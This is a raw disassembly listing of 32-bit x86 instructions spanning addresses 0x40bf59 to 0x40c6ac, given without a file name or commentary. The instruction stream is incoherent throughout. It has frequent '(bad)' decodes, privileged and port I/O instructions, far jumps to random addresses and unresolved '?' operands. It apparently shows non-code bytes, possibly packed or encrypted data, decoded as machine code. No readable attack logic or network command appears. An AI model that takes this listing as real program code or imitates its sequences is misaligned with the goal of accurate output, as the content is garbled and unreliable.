  40bf59:	sbb    DWORD PTR [edx+0x13a24d36],ebx
  40bf5f:	int3   
  40bf60:	leave  
  40bf61:	loop   0x40bfe2
  40bf63:	xchg   edi,eax
  40bf64:	pushf  
  40bf65:	shl    BYTE PTR [ecx-0x72],cl
  40bf68:	push   esi
  40bf69:	add    edx,DWORD PTR [ebx-0x45c1c914]
  40bf6f:	xchg   cl,bl
  40bf71:	fs stc 
  40bf73:	sbb    dh,al
  40bf75:	rcl    DWORD PTR [ecx-0x69430f6b],cl
  40bf7b:	mov    dl,0x67
  40bf7d:	adc    DWORD PTR [ecx-0x100bf3f7],esi
  40bf83:	out    dx,al
  40bf84:	pop    edi
  40bf85:	xlat   BYTE PTR ds:[ebx]
  40bf86:	xor    al,0xc1
  40bf88:	mov    ds:0xcb6987,eax
  40bf8d:	fs push es
  40bf8f:	imul   eax,DWORD PTR ds:0x1ea753bd,0x6b
  40bf96:	jg     0x40bfde
  40bf98:	rcr    BYTE PTR [ebx-0x12],1
  40bf9b:	xchg   edi,eax
  40bf9c:	pop    esi
  40bf9d:	in     al,dx
  40bf9e:	cdq    
  40bf9f:	inc    edx
  40bfa0:	dec    esi
  40bfa1:	pop    edx
  40bfa2:	popf   
  40bfa3:	lock outs dx,BYTE PTR ds:[esi]
  40bfa5:	or     esi,DWORD PTR ss:[esi-0xe166c3f]
  40bfac:	adc    edi,DWORD PTR [eax]
  40bfae:	fiadd  DWORD PTR [edx+0x7b661e55]
  40bfb4:	push   esi
  40bfb5:	dec    ebx
  40bfb6:	aam    0x8
  40bfb8:	arpl   di,ax
  40bfba:	mov    edx,0xb92f5e52
  40bfbf:	cmp    DWORD PTR [ebx],ebx
  40bfc1:	jmp    0x8d6cffbc
  40bfc6:	mov    ah,0xd9
  40bfc8:	mov    dh,0x1
  40bfca:	hlt    
  40bfcb:	enter  0x4669,0x4a
  40bfcf:	mov    eax,0x78804ee0
  40bfd4:	ins    DWORD PTR es:[edi],dx
  40bfd5:	sub    eax,0xbd76a5e6
  40bfda:	dec    esp
  40bfdb:	scas   eax,DWORD PTR es:[edi]
  40bfdc:	pop    ecx
  40bfdd:	str    WORD PTR [ecx+0x3aab3f7d]
  40bfe4:	add    eax,DWORD PTR [edi+0x49]
  40bfe7:	bound  edi,QWORD PTR [eax-0xf]
  40bfea:	xor    esp,esi
  40bfec:	xchg   cl,bh
  40bfee:	cmp    ch,BYTE PTR [edi+ecx*4+0x46e8e041]
  40bff5:	sub    DWORD PTR [esi+ecx*1+0x68],ebx
  40bff9:	jecxz  0x40c047
  40bffb:	aad    0x64
  40bffd:	ret    0x5b8d
  40c000:	xor    BYTE PTR [eax-0x3],dl
  40c003:	sbb    eax,0xb8d80fcf
  40c008:	push   ds
  40c009:	pop    ecx
  40c00a:	xor    BYTE PTR [ebx-0x26],al
  40c00d:	pop    eax
  40c00e:	mov    ah,BYTE PTR [edi-0x199af21f]
  40c014:	inc    ecx
  40c015:	mov    bh,bl
  40c017:	inc    ebx
  40c018:	mov    cl,0xad
  40c01a:	sbb    al,0x4a
  40c01c:	and    al,0x16
  40c01e:	adc    eax,0xccb233e8
  40c023:	leave  
  40c024:	sbb    al,0xb6
  40c026:	int3   
  40c027:	ins    BYTE PTR es:[edi],dx
  40c028:	dec    esi
  40c029:	push   ss
  40c02a:	cld    
  40c02b:	push   ecx
  40c02c:	sbb    DWORD PTR [ebx],edi
  40c02e:	lahf   
  40c02f:	mov    edx,0x622a1319
  40c034:	call   0xd49e:0xfe0b735c
  40c03b:	and    DWORD PTR [ebx-0x2c6e0ab],ecx
  40c041:	xor    BYTE PTR [ecx+ebx*4-0x36],cl
  40c045:	(bad)  
  40c046:	lods   al,BYTE PTR ds:[esi]
  40c047:	inc    eax
  40c048:	add    DWORD PTR [ecx],ebp
  40c04a:	in     eax,0xcb
  40c04c:	js     0x40c06a
  40c04e:	aas    
  40c04f:	jp     0x40c041
  40c051:	sub    al,0xca
  40c053:	repz push eax
  40c055:	cmp    BYTE PTR [ecx-0x73],0x19
  40c059:	and    eax,0x3008de34
  40c05e:	test   eax,0x6a51b2cf
  40c063:	and    al,0x2e
  40c065:	jg     0x40bff0
  40c067:	loopne 0x40c077
  40c069:	nop
  40c06a:	pop    ebp
  40c06b:	not    eax
  40c06d:	add    al,0x34
  40c06f:	out    dx,al
  40c070:	cmp    al,0xed
  40c072:	in     eax,0x47
  40c074:	adc    BYTE PTR [edx+0x2248e6b5],bh
  40c07a:	push   ds
  40c07b:	jge    0x40c09a
  40c07d:	push   edx
  40c07e:	push   ebx
  40c07f:	add    ebx,0x133a9420
  40c085:	add    al,0xd7
  40c087:	sbb    BYTE PTR [esi],0xbd
  40c08a:	pop    ds
  40c08b:	ret    0xeb
  40c08e:	jg     0x40c0e1
  40c090:	leave  
  40c091:	mov    bh,BYTE PTR [eax-0x77498dc3]
  40c097:	aas    
  40c098:	lock add ch,BYTE PTR [ebp+0x26dc9335]
  40c09f:	pop    esi
  40c0a0:	cmc    
  40c0a1:	pushf  
  40c0a2:	mul    esp
  40c0a4:	dec    eax
  40c0a5:	jecxz  0x40c0ef
  40c0a7:	inc    esp
  40c0a8:	add    DWORD PTR [eax-0x17],esi
  40c0ab:	stc    
  40c0ac:	xchg   BYTE PTR [ecx],ah
  40c0ae:	adc    eax,0xb9922767
  40c0b3:	cli    
  40c0b4:	push   eax
  40c0b5:	addr16 jmp 0x40c111
  40c0b8:	pop    ebp
  40c0b9:	sbb    eax,0x70e1882e
  40c0be:	mov    ah,0x70
  40c0c0:	jo     0x40c067
  40c0c2:	xor    eax,0x7cc3d719
  40c0c7:	imul   edx,DWORD PTR [edi],0x626e2a64
  40c0cd:	retf   
  40c0ce:	mov    ah,0x14
  40c0d0:	inc    esp
  40c0d1:	cmp    dl,BYTE PTR [esi+0x1cedf844]
  40c0d7:	adc    bh,BYTE PTR es:[ebp-0x5cc85a1b]
  40c0de:	mov    ah,cl
  40c0e0:	push   ss
  40c0e1:	(bad)  
  40c0e2:	clc    
  40c0e3:	adc    edx,DWORD PTR ds:0x4f9927e2
  40c0e9:	retf   
  40c0ea:	(bad)
  40c0ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0ee:	cmp    al,0xc6
  40c0f0:	adc    ecx,ebx
  40c0f2:	jno    0x40c07b
  40c0f4:	push   cs
  40c0f5:	repz add dl,BYTE PTR [ebx-0x32]
  40c0f9:	(bad)  
  40c0fa:	in     al,dx
  40c0fb:	sub    al,0x18
  40c0fd:	push   0x6
  40c0ff:	div    DWORD PTR [edi]
  40c101:	push   0x74b4431c
  40c106:	loop   0x40c0ac
  40c108:	cmp    bh,ah
  40c10a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c10b:	inc    esi
  40c10c:	stc    
  40c10d:	dec    edx
  40c10e:	mov    eax,0xc883bb64
  40c113:	push   edx
  40c114:	(bad)  
  40c115:	cmp    eax,DWORD PTR [esi]
  40c117:	pusha  
  40c118:	pop    es
  40c119:	(bad)  
  40c11a:	mov    ebp,0x56af7b83
  40c11f:	(bad)  
  40c120:	iret   
  40c121:	adc    al,0x4
  40c123:	pop    edi
  40c124:	jmp    DWORD PTR [esi+0x20]
  40c127:	jne    0x40c1a1
  40c129:	push   edx
  40c12a:	fmul   DWORD PTR [esi-0x75]
  40c12d:	test   ebx,ebx
  40c12f:	adc    ebp,DWORD PTR [edi]
  40c131:	clc    
  40c132:	(bad)  
  40c133:	loop   0x40c169
  40c135:	cmp    BYTE PTR [edx-0x55],bh
  40c138:	mov    BYTE PTR [ebx+0x1c],cl
  40c13b:	fbstp  TBYTE PTR [eax+0x1a]
  40c13e:	jnp    0x40c183
  40c140:	dec    ebp
  40c141:	jns    0x40c19f
  40c143:	dec    ebx
  40c144:	in     eax,0xff
  40c146:	sub    DWORD PTR [edi+0x18],edi
  40c149:	or     dl,BYTE PTR [ecx]
  40c14b:	mul    BYTE PTR [ecx+0x39]
  40c14e:	mov    ch,0x3
  40c150:	xor    edx,DWORD PTR [esi-0x68]
  40c153:	pop    es
  40c154:	test   al,0x31
  40c156:	xor    eax,0x7c39ea01
  40c15b:	pop    esi
  40c15c:	xchg   edi,eax
  40c15d:	sahf   
  40c15e:	shl    BYTE PTR [edx-0x55],cl
  40c161:	leave  
  40c162:	mov    ah,0xa
  40c164:	jge    0x40c195
  40c166:	lods   al,BYTE PTR ds:[esi]
  40c167:	pop    esi
  40c168:	or     DWORD PTR [eax+0x1927f71b],ebx
  40c16e:	call   0xffe6:0x638d670b
  40c175:	xor    al,0xd
  40c177:	rcr    DWORD PTR [edi-0x21615f54],0x66
  40c17e:	pop    ebp
  40c17f:	bound  ebp,QWORD PTR [edi]
  40c181:	sub    eax,0xd960b2bc
  40c186:	sub    dh,dh
  40c188:	xor    DWORD PTR [edx],esi
  40c18a:	adc    cl,BYTE PTR [ebx+0x3e6a7e25]
  40c190:	repnz mov bh,0x90
  40c193:	mov    bh,0x78
  40c195:	or     eax,0xb59b9bac
  40c19a:	sub    eax,0x54a2f6c4
  40c19f:	pop    ds
  40c1a0:	(bad)  
  40c1a2:	test   eax,0xdbbf5105
  40c1a7:	jl     0x40c1e3
  40c1a9:	xor    ebp,esp
  40c1ab:	cmp    DWORD PTR [ecx],ecx
  40c1ad:	fisubr WORD PTR [ebp+ecx*4+0x2b3985d7]
  40c1b4:	es sahf 
  40c1b6:	call   0xff0c11ff
  40c1bb:	or     al,0xfd
  40c1bd:	push   ebx
  40c1be:	(bad)  
  40c1bf:	pop    esp
  40c1c0:	jne    0x40c201
  40c1c2:	sbb    esi,ecx
  40c1c4:	fsub   DWORD PTR [edi-0x22]
  40c1c7:	loop   0x40c14f
  40c1c9:	mov    cs,WORD PTR [edi+0x55]
  40c1cc:	dec    ecx
  40c1cd:	mov    edx,0xaecfa960
  40c1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1d3:	inc    edi
  40c1d4:	mov    dl,0x87
  40c1d6:	sbb    BYTE PTR [eax+ebp*1+0x79],bh
  40c1da:	es adc dl,0x93
  40c1de:	leave  
  40c1df:	fstp   QWORD PTR ds:0x8a5878e8
  40c1e5:	inc    eax
  40c1e6:	push   ss
  40c1e7:	clc    
  40c1e8:	jno    0x40c1b6
  40c1ea:	xchg   ebp,eax
  40c1eb:	adc    BYTE PTR [ebp-0xd80d624],cl
  40c1f1:	mov    fs,WORD PTR [eax+esi*8-0xe7bf987]
  40c1f8:	mov    edi,0x31033235
  40c1fd:	popf   
  40c1fe:	pop    edx
  40c1ff:	(bad)  
  40c200:	cli    
  40c201:	mov    eax,ds:0xa9f9c96e
  40c206:	pop    esi
  40c207:	mov    al,0xf6
  40c209:	sti    
  40c20a:	pushf  
  40c20b:	xchg   DWORD PTR [ebx],esp
  40c20d:	xor    ch,BYTE PTR [ebx]
  40c20f:	mul    DWORD PTR [eax+eiz*8-0x350f25fe]
  40c216:	imul   esp,DWORD PTR ds:0x312ea393,0xffffffd8
  40c21d:	aaa    
  40c21e:	sar    BYTE PTR [edi+0x4b],1
  40c221:	imul   DWORD PTR [ecx-0x32a046f2]
  40c227:	in     eax,0xe3
  40c229:	adc    al,al
  40c22b:	jmp    0xb9193bf0
  40c230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c231:	pop    ss
  40c232:	aas    
  40c233:	loopne 0x40c232
  40c235:	xchg   ebp,eax
  40c236:	inc    esp
  40c237:	jno    0x40c1e9
  40c239:	sub    al,dl
  40c23b:	mov    cl,0xa8
  40c23d:	sti    
  40c23e:	cdq    
  40c23f:	add    DWORD PTR [ebp+ebp*4-0x4d],eax
  40c243:	mov    esp,0xc365c727
  40c248:	sub    ecx,esp
  40c24a:	test   DWORD PTR [edx+0x5b4aff78],ecx
  40c250:	out    dx,eax
  40c251:	mov    edx,DWORD PTR [edi+eiz*2]
  40c254:	inc    edi
  40c255:	shl    DWORD PTR [ebp-0x266eba1d],0xb9
  40c25c:	inc    eax
  40c25d:	int    0x29
  40c25f:	pop    edx
  40c260:	or     al,0x6e
  40c262:	cli    
  40c263:	jmp    0x7e7a:0xb0a38cbc
  40c26a:	sub    esp,DWORD PTR [edx+0x41]
  40c26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c26e:	xchg   DWORD PTR [edi+0x4aa6b6],edx
  40c274:	aad    0xe9
  40c276:	je     0x40c2e4
  40c278:	lods   eax,DWORD PTR ds:[esi]
  40c279:	stc    
  40c27a:	sbb    eax,0xbfe42beb
  40c27f:	xor    cl,BYTE PTR [edi-0x54c062cf]
  40c285:	xchg   edi,eax
  40c286:	inc    eax
  40c287:	out    dx,eax
  40c288:	and    DWORD PTR [ecx-0x5e295a57],edx
  40c28e:	iret   
  40c28f:	imul   edx,DWORD PTR [edi+0x2e49f6f3],0xfea24e44
  40c299:	inc    edi
  40c29a:	lea    esi,[ecx-0x8]
  40c29d:	dec    esi
  40c29e:	aas    
  40c29f:	cs ins DWORD PTR es:[edi],dx
  40c2a1:	(bad)  
  40c2a2:	test   eax,0x5b15e124
  40c2a7:	scas   al,BYTE PTR es:[edi]
  40c2a8:	xchg   ebx,eax
  40c2a9:	adc    eax,ebx
  40c2ab:	jmp    0xf4c9:0xbc6a86d3
  40c2b2:	daa    
  40c2b3:	daa    
  40c2b4:	enter  0xb984,0x56
  40c2b8:	pop    ss
  40c2b9:	add    bh,BYTE PTR [edi]
  40c2bb:	sbb    ebx,DWORD PTR [ebp-0x56]
  40c2be:	push   es
  40c2bf:	mov    esp,DWORD PTR [esi]
  40c2c1:	int3   
  40c2c2:	mov    ebx,0x556ab577
  40c2c7:	jmp    0xb2d4c880
  40c2cc:	inc    ecx
  40c2cd:	loopne 0x40c283
  40c2cf:	add    eax,0xd01325ca
  40c2d4:	sub    DWORD PTR [ecx-0x4b],esp
  40c2d7:	sti    
  40c2d8:	loop   0x40c2d2
  40c2da:	in     al,0x41
  40c2dc:	sub    DWORD PTR [esi-0x77],edx
  40c2df:	xchg   ebp,eax
  40c2e0:	inc    esi
  40c2e1:	mov    edi,DWORD PTR [eax]
  40c2e3:	fcomp  DWORD PTR [edx+eiz*2]
  40c2e6:	mov    ecx,0x2773e084
  40c2eb:	jge    0x40c351
  40c2ed:	jmp    0xba89:0x51af1108
  40c2f4:	scas   eax,DWORD PTR es:[edi]
  40c2f5:	xchg   DWORD PTR [edi+0x1c010699],edi
  40c2fb:	inc    ebx
  40c2fc:	arpl   ax,si
  40c2fe:	mov    esi,0x2548e4a0
  40c303:	sbb    esi,DWORD PTR [esi-0x43ff0764]
  40c309:	sub    DWORD PTR [ebx],ecx
  40c30b:	cmp    eax,0xe1831eb1
  40c310:	mov    ah,0xcf
  40c312:	enter  0x84ad,0x1c
  40c316:	cmc    
  40c317:	cmp    eax,0xa19d2d56
  40c31c:	neg    BYTE PTR [edi]
  40c31e:	ja     0x40c38d
  40c320:	inc    edx
  40c321:	addr16 or al,0xce
  40c324:	sbb    eax,edi
  40c326:	arpl   WORD PTR ds:0xf7a628ba,ax
  40c32c:	dec    eax
  40c32d:	scas   eax,DWORD PTR es:[edi]
  40c32e:	jns    0x40c330
  40c330:	fwait
  40c331:	mov    al,0xb5
  40c333:	sti    
  40c334:	ins    DWORD PTR es:[edi],dx
  40c335:	(bad)  
  40c336:	test   ecx,0x18b4b615
  40c33c:	lock outs dx,BYTE PTR es:[esi]
  40c33f:	inc    ebp
  40c340:	daa    
  40c341:	cmp    ecx,DWORD PTR [eax+ebx*2-0x51]
  40c345:	push   eax
  40c346:	inc    esp
  40c347:	mov    ch,0xfa
  40c349:	adc    dl,dh
  40c34b:	not    BYTE PTR [esi+0x638de7e4]
  40c351:	jbe    0x40c318
  40c353:	inc    ebx
  40c354:	xchg   esp,eax
  40c355:	test   BYTE PTR [ebx+ebp*1+0xde0df8a],dh
  40c35c:	mov    bh,0xf5
  40c35e:	clc    
  40c35f:	xor    ebx,eax
  40c361:	pop    ebx
  40c362:	mov    bl,0x83
  40c364:	lea    edx,[eax]
  40c366:	mov    esi,0xde1ec9f6
  40c36b:	pop    esi
  40c36c:	sub    al,0x54
  40c36e:	out    0xe1,al
  40c370:	cmp    dh,bl
  40c372:	rol    DWORD PTR [esi],1
  40c374:	(bad)  
  40c376:	jmp    0xb80:0xe15a02c6
  40c37d:	mov    bh,0xbd
  40c37f:	int    0x22
  40c381:	jmp    DWORD PTR ds:0x252de33b
  40c387:	sub    bl,ch
  40c389:	mov    ds:0xf09c9e57,al
  40c38e:	pop    eax
  40c38f:	addr16 icebp 
  40c391:	mov    bh,0x45
  40c393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c394:	out    dx,al
  40c395:	pop    ebx
  40c396:	fld    TBYTE PTR [edx-0x48ff8b9d]
  40c39c:	fwait
  40c39d:	call   0xe1b80a27
  40c3a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3a3:	clc    
  40c3a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3a5:	aas    
  40c3a6:	enter  0x7274,0xa4
  40c3aa:	cdq    
  40c3ab:	test   al,0x3a
  40c3ad:	lock inc BYTE PTR [esi+0x7be43bd9]
  40c3b4:	bswap  ebp
  40c3b6:	dec    esi
  40c3b7:	mov    cl,BYTE PTR [esi-0x53fb7412]
  40c3bd:	push   edi
  40c3be:	out    0x4c,al
  40c3c0:	in     al,0x8b
  40c3c2:	lahf   
  40c3c3:	inc    eax
  40c3c4:	fstp   st(7)
  40c3c6:	fadd   DWORD PTR [esi-0x60655c0e]
  40c3cc:	xchg   ecx,eax
  40c3cd:	test   al,0x9
  40c3cf:	retf   
  40c3d0:	sbb    al,0x90
  40c3d2:	outs   dx,BYTE PTR ds:[esi]
  40c3d3:	adc    eax,0x1df97244
  40c3d8:	es inc ebx
  40c3da:	inc    ebx
  40c3db:	push   eax
  40c3dc:	mov    ch,0x88
  40c3de:	fistp  DWORD PTR [edi-0x4da7cb07]
  40c3e4:	inc    esp
  40c3e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3e6:	ror    BYTE PTR [eax+edx*8-0x52],0x2d
  40c3eb:	mov    bl,0x86
  40c3ed:	jge    0x40c45e
  40c3ef:	ret    
  40c3f0:	ds leave 
  40c3f2:	or     al,0x27
  40c3f4:	lods   eax,DWORD PTR ds:[esi]
  40c3f5:	test   BYTE PTR [edx+0x11],0x68
  40c3f9:	sbb    al,0xe4
  40c3fb:	dec    esp
  40c3fc:	aas    
  40c3fd:	psubsw mm5,QWORD PTR [ebx+0x6a]
  40c401:	outs   dx,BYTE PTR ds:[esi]
  40c402:	lods   eax,DWORD PTR ds:[esi]
  40c403:	(bad)
  40c406:	add    BYTE PTR [esi],0x1a
  40c409:	sahf   
  40c40a:	xor    BYTE PTR [edx-0x64232f2a],0x50
  40c411:	pushf  
  40c412:	shl    DWORD PTR [edi-0x7d9a1bb5],cl
  40c418:	hlt    
  40c419:	repnz dec edx
  40c41b:	add    edi,DWORD PTR [esi+ebp*2+0x2c]
  40c41f:	xchg   ebx,eax
  40c420:	hlt    
  40c421:	popa   
  40c422:	lods   al,BYTE PTR ds:[si]
  40c424:	sub    bh,dl
  40c426:	dec    ebp
  40c427:	out    dx,al
  40c428:	aas    
  40c429:	push   ecx
  40c42a:	dec    esi
  40c42b:	sub    eax,0x53a32e77
  40c430:	pusha  
  40c431:	adc    dl,al
  40c433:	addr16 gs dec edi
  40c436:	mov    WORD PTR [esi+0x4c],?
  40c439:	in     al,0x51
  40c43b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c43c:	test   BYTE PTR [edx],ah
  40c43e:	xrelease xchg BYTE PTR [edi],dl
  40c441:	add    BYTE PTR [edi+esi*4-0x71],bl
  40c445:	pop    es
  40c446:	push   esp
  40c447:	adc    BYTE PTR [ebx+eax*1+0x16076caa],al
  40c44e:	push   eax
  40c44f:	mov    bh,0x80
  40c451:	sahf   
  40c452:	mov    ah,0x85
  40c454:	jb     0x40c434
  40c456:	retf   
  40c457:	fadd   st,st(3)
  40c459:	data16 add bh,BYTE PTR ds:0x2b306a6a
  40c460:	or     al,0x54
  40c462:	fwait
  40c463:	pop    ebx
  40c464:	fdivr  DWORD PTR [ebx-0x59b7b73]
  40c46a:	lods   eax,DWORD PTR ds:[esi]
  40c46b:	sub    al,0xc7
  40c46d:	rcr    DWORD PTR [esi-0x4f54f793],cl
  40c473:	push   ebx
  40c474:	xor    eax,0x13badac3
  40c479:	jp     0x40c416
  40c47b:	(bad)  
  40c47c:	ds scas al,BYTE PTR es:[edi]
  40c47e:	rcr    cl,0x31
  40c481:	jle    0x40c485
  40c483:	out    dx,al
  40c484:	and    ch,al
  40c486:	mov    al,0x32
  40c488:	and    esi,DWORD PTR [eax-0x2aff3f99]
  40c48e:	mov    ebx,0xfe811b95
  40c493:	pusha  
  40c494:	pop    ss
  40c495:	push   ecx
  40c496:	into   
  40c497:	push   edx
  40c498:	std    
  40c499:	(bad)  
  40c49b:	add    al,0x85
  40c49d:	jns    0x40c445
  40c49f:	daa    
  40c4a0:	xchg   ebx,eax
  40c4a1:	adc    al,0x57
  40c4a3:	inc    esi
  40c4a4:	retf   0x478
  40c4a7:	add    dh,BYTE PTR [esi-0x50]
  40c4aa:	jbe    0x40c44a
  40c4ac:	and    al,0x35
  40c4ae:	ret    0x5a5a
  40c4b1:	in     eax,0x4b
  40c4b3:	adc    al,0xb8
  40c4b5:	outs   dx,BYTE PTR ds:[esi]
  40c4b6:	jge    0x40c4c7
  40c4b8:	icebp  
  40c4b9:	(bad)  
  40c4ba:	xchg   ebp,eax
  40c4bb:	add    esi,DWORD PTR ds:0x5b98bce1
  40c4c1:	stos   BYTE PTR es:[edi],al
  40c4c2:	dec    edx
  40c4c3:	(bad)  
  40c4c4:	adc    eax,0x995c969d
  40c4c9:	addr16 aad 0xe8
  40c4cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4cd:	jge    0x40c4bd
  40c4cf:	push   edx
  40c4d0:	dec    ecx
  40c4d1:	add    al,0x9d
  40c4d3:	mov    esp,0xb46c902c
  40c4d8:	push   ebx
  40c4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4da:	mov    ebp,0xbd7dc84f
  40c4df:	push   esi
  40c4e0:	stos   BYTE PTR es:[edi],al
  40c4e1:	jb     0x40c4fc
  40c4e3:	out    0xd3,eax
  40c4e5:	pop    edi
  40c4e6:	cmp    DWORD PTR [eax+0x69],esi
  40c4e9:	shr    BYTE PTR [edi+0x68],0xb8
  40c4ed:	jbe    0x40c535
  40c4ef:	outs   dx,BYTE PTR ds:[esi]
  40c4f0:	clc    
  40c4f1:	repz dec ebx
  40c4f3:	or     eax,0x53213907
  40c4f8:	jns    0x40c4ac
  40c4fa:	sar    BYTE PTR [ebx-0x3c7783b0],0x21
  40c501:	stc    
  40c502:	sbb    BYTE PTR [esi+0x62211c7d],dl
  40c508:	xchg   ebx,eax
  40c509:	mov    al,ds:0x81e35d3
  40c50e:	fcmovb st,st(5)
  40c510:	push   0xc0969ed6
  40c515:	popf   
  40c516:	xchg   edx,eax
  40c517:	jmp    0x9e11:0x84410340
  40c51e:	push   ebx
  40c51f:	scas   eax,DWORD PTR es:[edi]
  40c520:	test   DWORD PTR [esi-0x11],esi
  40c523:	jecxz  0x40c4a5
  40c525:	mov    ebp,0x7cbc9791
  40c52a:	mov    ebx,0x46b86968
  40c52f:	shl    BYTE PTR [ebx],cl
  40c531:	xchg   esi,eax
  40c532:	adc    al,0xa1
  40c534:	pcmpgtw mm4,QWORD PTR [ecx-0x299a332a]
  40c53b:	jl     0x40c578
  40c53d:	add    BYTE PTR [ebp+0x29e660f6],dh
  40c543:	out    0xfc,eax
  40c545:	lds    esi,FWORD PTR [ebp+0x199a7897]
  40c54b:	or     eax,0xc2336537
  40c550:	pop    edi
  40c551:	dec    eax
  40c552:	sub    ecx,DWORD PTR [ecx]
  40c554:	add    al,0x73
  40c556:	iret   
  40c557:	inc    ebx
  40c558:	sub    eax,edi
  40c55a:	lahf   
  40c55b:	(bad)  
  40c55c:	fild   WORD PTR [ebp+0x4c3063c9]
  40c562:	jb     0x40c5cf
  40c564:	into   
  40c565:	mov    ds:0xb4523cee,al
  40c56a:	mov    eax,ds:0xd97d7968
  40c56f:	add    DWORD PTR [eax+0x53],eax
  40c572:	jb     0x40c5cd
  40c574:	fsub   DWORD PTR [edx+ecx*8-0x3d93a57a]
  40c57b:	add    al,0x28
  40c57d:	push   ds
  40c57e:	xlat   BYTE PTR ds:[ebx]
  40c57f:	std    
  40c580:	test   DWORD PTR ds:0xd25e352b,0x786c6942
  40c58a:	mov    esp,edx
  40c58c:	dec    ebx
  40c58d:	mov    ?,WORD PTR [edx+0xb37d3a7]
  40c593:	int3   
  40c594:	icebp  
  40c595:	shl    WORD PTR [ecx-0xe5422a6],1
  40c59c:	nop
  40c59d:	aaa    
  40c59e:	add    al,dl
  40c5a0:	jno    0x40c52e
  40c5a2:	int3   
  40c5a3:	sbb    ch,BYTE PTR [ebp+0x60]
  40c5a6:	mov    ah,0xb3
  40c5a8:	fwait
  40c5a9:	div    BYTE PTR [edi+0x11]
  40c5ac:	adc    ecx,esi
  40c5ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5af:	loopne 0x40c620
  40c5b1:	and    BYTE PTR ds:0x3d8985ee,ch
  40c5b7:	jle    0x40c611
  40c5b9:	pop    esp
  40c5ba:	add    edi,DWORD PTR [edx-0x236b015c]
  40c5c0:	pop    esp
  40c5c1:	inc    esi
  40c5c2:	loopne 0x40c620
  40c5c4:	lock push ebx
  40c5c6:	inc    ebx
  40c5c7:	add    bl,BYTE PTR [eax+ebp*1]
  40c5ca:	inc    eax
  40c5cb:	out    dx,eax
  40c5cc:	jb     0x40c615
  40c5ce:	and    ebx,edx
  40c5d0:	in     eax,0x54
  40c5d2:	addr16 push ss
  40c5d4:	icebp  
  40c5d5:	mov    dh,0x62
  40c5d7:	push   ecx
  40c5d8:	test   al,0x6e
  40c5da:	fst    st(0)
  40c5dc:	data16 xchg BYTE PTR [eax+0x24fa81c2],dl
  40c5e3:	aas    
  40c5e4:	fldcw  WORD PTR [edi]
  40c5e6:	aaa    
  40c5e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e8:	jge    0x40c571
  40c5ea:	or     BYTE PTR [edi+0x36],bl
  40c5ed:	pop    ebx
  40c5ee:	mov    edi,0x3e22dbd9
  40c5f3:	or     ecx,DWORD PTR [ebx]
  40c5f5:	mov    edi,0x3c1a20bd
  40c5fa:	cld    
  40c5fb:	or     ah,BYTE PTR [ebp+0x5df74a9e]
  40c601:	cmp    ecx,DWORD PTR [ecx+ebx*8-0x1f]
  40c605:	out    dx,al
  40c606:	in     al,dx
  40c607:	push   ecx
  40c608:	sbb    esi,DWORD PTR [ebp-0x2a94b289]
  40c60e:	dec    ebp
  40c60f:	add    edx,DWORD PTR [esi+0x2a]
  40c612:	push   esi
  40c613:	sub    DWORD PTR [ecx],ecx
  40c615:	das    
  40c616:	inc    sp
  40c618:	fcmovnb st,st(5)
  40c61a:	icebp  
  40c61b:	ins    BYTE PTR es:[edi],dx
  40c61c:	leave  
  40c61d:	clc    
  40c61e:	cmp    eax,0x245f4464
  40c623:	aaa    
  40c624:	sub    al,0x3a
  40c626:	mov    bh,0xa6
  40c628:	xchg   ebx,eax
  40c629:	ja     0x40c68e
  40c62b:	dec    ebx
  40c62c:	inc    ebx
  40c62d:	stos   BYTE PTR es:[edi],al
  40c62e:	out    dx,eax
  40c62f:	inc    eax
  40c630:	mov    al,ds:0xf97973da
  40c635:	aam    0x1d
  40c637:	cwde   
  40c638:	add    al,0x68
  40c63a:	jae    0x40c67c
  40c63c:	inc    ebx
  40c63d:	add    BYTE PTR [ecx-0x43f31b8],ah
  40c643:	push   ebp
  40c644:	cs jnp 0x40c65f
  40c647:	ret    0x842f
  40c64a:	in     al,dx
  40c64b:	imul   esi,esp,0x49
  40c64e:	out    dx,eax
  40c64f:	push   edx
  40c650:	jle    0x40c641
  40c652:	add    al,0x48
  40c654:	and    eax,0x8ae3b7b5
  40c659:	mov    ebx,0x9ff64643
  40c65e:	aad    0xd6
  40c660:	cmp    al,0xee
  40c662:	sbb    BYTE PTR [esi],bh
  40c664:	and    bh,ch
  40c666:	push   edx
  40c667:	pop    ecx
  40c668:	int3   
  40c669:	stos   DWORD PTR es:[edi],eax
  40c66a:	arpl   WORD PTR [ecx],bx
  40c66c:	xlat   BYTE PTR ds:[ebx]
  40c66d:	scas   al,BYTE PTR es:[edi]
  40c66e:	and    cl,BYTE PTR [edx+0x38960333]
  40c674:	mov    al,ds:0x13166117
  40c679:	jle    0x40c681
  40c67b:	out    dx,eax
  40c67c:	sub    al,0xf
  40c67e:	push   ebx
  40c67f:	sahf   
  40c680:	stos   BYTE PTR es:[edi],al
  40c681:	sar    ebx,1
  40c683:	jne    0x40c654
  40c685:	mov    eax,0x6b52327b
  40c68a:	xchg   ecx,eax
  40c68b:	and    ebp,DWORD PTR [edx]
  40c68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68e:	fdiv   DWORD PTR [ebx-0x21]
  40c691:	push   ds
  40c692:	ret    0xf1c0
  40c695:	cmc    
  40c696:	xor    bh,BYTE PTR [edx+0x1c07cf70]
  40c69c:	ds inc edi
  40c69e:	(bad)  
  40c6a0:	test   al,0x91
  40c6a2:	jnp    0x40c6d0
  40c6a4:	and    bh,BYTE PTR [eax]
  40c6a6:	pop    es
  40c6a7:	push   0x9c39f22e
  40c6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
